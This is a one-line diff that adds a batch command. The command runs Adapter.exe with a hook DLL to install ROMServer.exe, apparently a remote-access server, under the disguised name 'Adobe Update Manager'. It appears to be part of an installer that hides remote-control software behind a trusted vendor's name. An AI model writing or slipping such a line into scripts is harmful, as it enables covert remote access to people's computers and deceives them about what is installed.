@@ -1,0 +1,1 @@
+call Adapter.exe -h hookDll.dll "Adobe Update Manager" "%DST%\ROMServer.exe"
